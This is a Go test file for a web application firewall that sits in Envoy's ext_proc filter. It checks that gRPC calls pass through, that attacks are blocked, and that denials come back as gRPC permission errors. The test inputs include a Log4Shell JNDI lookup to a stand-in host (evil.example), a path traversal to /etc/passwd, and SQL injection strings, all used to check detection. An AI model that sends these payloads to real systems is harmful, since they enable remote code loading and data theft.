// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package extproc

import (
	"bytes"
	"encoding/binary"
	"testing"

	corev3 "github.com/envoyproxy/go-control-plane/envoy/config/core/v3"
	filterv3 "github.com/envoyproxy/go-control-plane/envoy/extensions/filters/http/ext_proc/v3"
	extprocv3 "github.com/envoyproxy/go-control-plane/envoy/service/ext_proc/v3"
	"google.golang.org/protobuf/types/known/structpb"

	"github.com/inkwall-dev/inkwall/pkg/pipeline"
)

// grpcMessages frames each message as gRPC does: a compressed flag, a
// 4-byte length, the message. Each message is a protobuf string field 1.
func grpcMessages(names ...string) string {
	var b []byte
	for _, n := range names {
		msg := append([]byte{0x0a, byte(len(n))}, n...)
		b = append(b, 0, 0, 0, 0, 0)
		binary.BigEndian.PutUint32(b[len(b)-4:], uint32(len(msg)))
		b = append(b, msg...)
	}
	return string(b)
}

// grpcHeaders is the request_headers message Envoy sends for a gRPC call
// over HTTP/2: no Content-Length, the body follows.
func grpcHeaders(path string, kv ...string) *extprocv3.ProcessingRequest {
	hs := []*corev3.HeaderValue{
		{Key: ":method", RawValue: []byte("POST")},
		{Key: ":path", RawValue: []byte(path)},
		{Key: ":authority", RawValue: []byte("grpc.example.com")},
		{Key: ":scheme", RawValue: []byte("http")},
		{Key: "content-type", RawValue: []byte("application/grpc")},
		{Key: "te", RawValue: []byte("trailers")},
		{Key: "user-agent", RawValue: []byte("grpc-go/1.75.0")},
		{Key: "grpc-timeout", RawValue: []byte("9998m")},
		{Key: "x-request-id", RawValue: []byte("envoy-id-1")},
	}
	for i := 0; i+1 < len(kv); i += 2 {
		hs = append(hs, &corev3.HeaderValue{Key: kv[i], RawValue: []byte(kv[i+1])})
	}
	m := &extprocv3.ProcessingRequest{
		Request: &extprocv3.ProcessingRequest_RequestHeaders{
			RequestHeaders: &extprocv3.HttpHeaders{Headers: &corev3.HeaderMap{Headers: hs}},
		},
		Attributes: map[string]*structpb.Struct{"envoy.filters.http.ext_proc": {Fields: map[string]*structpb.Value{
			"request.protocol": structpb.NewStringValue("HTTP/2")}}},
	}
	// As Envoy Gateway configures the filter for a policy in block mode.
	return withMode(m, filterv3.ProcessingMode_BUFFERED_PARTIAL)
}

// TestGRPC: gRPC calls through Envoy's ext_proc filter, with the embedded
// CRS. Before v0.3.1 they were all denied in block mode (920420, and 920270
// and 921150 on the binary body) and logged in detect mode.
func TestGRPC(t *testing.T) {
	const limit = 64
	stream := grpcMessages("alpha", "beta", "gamma", "delta", "epsilon", "zeta", "eta", "theta", "iota")
	if len(stream) <= limit {
		t.Fatalf("stream of %d bytes, want more than the %d-byte limit", len(stream), limit)
	}
	tests := []struct {
		name    string
		headers *extprocv3.ProcessingRequest
		body    string
		eos     bool
		want    int // status of the denial; 0 allows
	}{
		{"unary", grpcHeaders("/helloworld.Greeter/SayHello"), grpcMessages("world"), true, 0},
		{"client stream", grpcHeaders("/routeguide.RouteGuide/RecordRoute"), grpcMessages("a", "b", "c"), true, 0},
		// Cut at Envoy's buffer: a gRPC body isn't inspected, so it isn't
		// oversized either.
		{"client stream over the limit", grpcHeaders("/routeguide.RouteGuide/RecordRoute"), stream[:limit], false, 0},
		{"attack in metadata", grpcHeaders("/helloworld.Greeter/SayHello", "x-api-key", "${jndi:ldap://evil.example/a}"),
			grpcMessages("world"), true, 403},
		{"attack in the path", grpcHeaders("/helloworld.Greeter/../../../../etc/passwd"), grpcMessages("world"), true, 403},
		// A JSON body only labelled gRPC is inspected as before.
		{"json labelled grpc", grpcHeaders("/api/search"), `{"q":"1' OR '1'='1' -- "}`, true, 403},
	}
	for _, mode := range []pipeline.Mode{pipeline.ModeBlock, pipeline.ModeDetect} {
		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				var logs bytes.Buffer
				e := newEnvoy(t, newPipeline(t, mode), limit, &logs)
				resps := e.exchange(t, tt.headers, body(tt.body, tt.eos))
				if len(resps) != 2 {
					t.Fatalf("answers %v: the verdict must wait for the body", resps)
				}
				continued(t, resps[0])
				want := tt.want
				if mode == pipeline.ModeDetect {
					want = 0
				}
				if got := denied(t, resps[1]); got != want {
					t.Fatalf("mode %d: status %d, want %d (%v); events: %s", mode, got, want, resps[1], logs.String())
				}
				if want == 0 {
					continued(t, resps[1])
				}
				if logged := logs.Len() != 0; logged != (tt.want != 0) {
					t.Fatalf("mode %d: events %q, want one only for an attack", mode, logs.String())
				}
			})
		}
	}
}

// immediate returns an immediate response's headers, by lower-case name.
func immediate(t *testing.T, r *extprocv3.ProcessingResponse) (*extprocv3.ImmediateResponse, map[string]string) {
	t.Helper()
	ir := r.GetImmediateResponse()
	if ir == nil {
		t.Fatalf("answer %v, want an immediate response", r)
	}
	set := map[string]string{}
	for _, h := range ir.GetHeaders().GetSetHeaders() {
		set[h.GetHeader().GetKey()] = string(h.GetHeader().GetRawValue())
	}
	return ir, set
}

// TestGRPCDenial: a denied gRPC call is answered as gRPC: grpc-status 7
// (PERMISSION_DENIED) and a grpc-message in the headers, and no body.
// Before, the engine answered a 403 with a text body, which Envoy turned
// into a grpc-status from the HTTP status, and a gRPC-Web client got the
// 403 as it was.
func TestGRPCDenial(t *testing.T) {
	const attack = "${jndi:ldap://evil.example/a}"
	web := func(path string, kv ...string) *extprocv3.ProcessingRequest {
		m := grpcHeaders(path, kv...)
		for _, h := range m.GetRequestHeaders().GetHeaders().GetHeaders() {
			if h.GetKey() == "content-type" {
				h.RawValue = []byte("application/grpc-web-text+proto")
			}
		}
		return m
	}
	tests := []struct {
		name string
		msgs []*extprocv3.ProcessingRequest
		// HTTP status Envoy answers with: 403 for gRPC, which Envoy
		// answers as a gRPC call itself (HTTP 200); 200 for gRPC-Web,
		// whose trailers-only form Envoy sends as it is.
		status      int
		contentType string
	}{
		{"attack in metadata", []*extprocv3.ProcessingRequest{
			grpcHeaders("/helloworld.Greeter/SayHello", "x-api-key", attack), body(grpcMessages("world"), true),
		}, 403, "application/grpc"},
		{"attack in the path, decided on the headers", []*extprocv3.ProcessingRequest{
			withEOS(grpcHeaders("/helloworld.Greeter/../../../../etc/passwd")),
		}, 403, "application/grpc"},
		// A JSON body only labelled gRPC is inspected as such, and its
		// client still asked for a gRPC answer.
		{"json labelled grpc", []*extprocv3.ProcessingRequest{
			grpcHeaders("/api/search"), body(`{"q":"1' OR '1'='1' -- "}`, true),
		}, 403, "application/grpc"},
		{"grpc-web text", []*extprocv3.ProcessingRequest{
			web("/helloworld.Greeter/SayHello", "x-api-key", attack), body("AAAAAAA=", true),
		}, 200, "application/grpc-web-text"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var logs bytes.Buffer
			e := newEnvoy(t, newPipeline(t, pipeline.ModeBlock), 64, &logs)
			resps := e.exchange(t, tt.msgs...)
			ir, set := immediate(t, resps[len(resps)-1])
			if got := int(ir.GetStatus().GetCode()); got != tt.status {
				t.Errorf("status %d, want %d", got, tt.status)
			}
			if got := ir.GetGrpcStatus(); got == nil || got.GetStatus() != 7 {
				t.Errorf("grpc_status %v, want 7 (PERMISSION_DENIED)", got)
			}
			want := map[string]string{
				"content-type": tt.contentType,
				"grpc-status":  "7",
				"grpc-message": "Forbidden (request ID envoy-id-1)",
				"x-request-id": "envoy-id-1",
			}
			for k, v := range want {
				if set[k] != v {
					t.Errorf("%s %q, want %q (headers %v)", k, set[k], v, set)
				}
			}
			// With a body, Envoy would make it the grpc-message.
			if len(ir.GetBody()) != 0 {
				t.Errorf("body %q, want none", ir.GetBody())
			}
		})
	}

	// Anything else is answered as before.
	var logs bytes.Buffer
	e := newEnvoy(t, newPipeline(t, pipeline.ModeBlock), 64, &logs)
	resps := e.exchange(t, headers("GET", "/?id=1%27%20OR%20%271%27%3D%271", true))
	ir, set := immediate(t, resps[0])
	if ir.GetStatus().GetCode() != 403 || ir.GetGrpcStatus() != nil || set["grpc-status"] != "" ||
		set["content-type"] != "text/plain; charset=utf-8" || string(ir.GetBody()) != "Forbidden\n" {
		t.Fatalf("HTTP denial %v", ir)
	}
}

// withEOS ends the request with its headers.
func withEOS(m *extprocv3.ProcessingRequest) *extprocv3.ProcessingRequest {
	m.GetRequestHeaders().EndOfStream = true
	return m
}
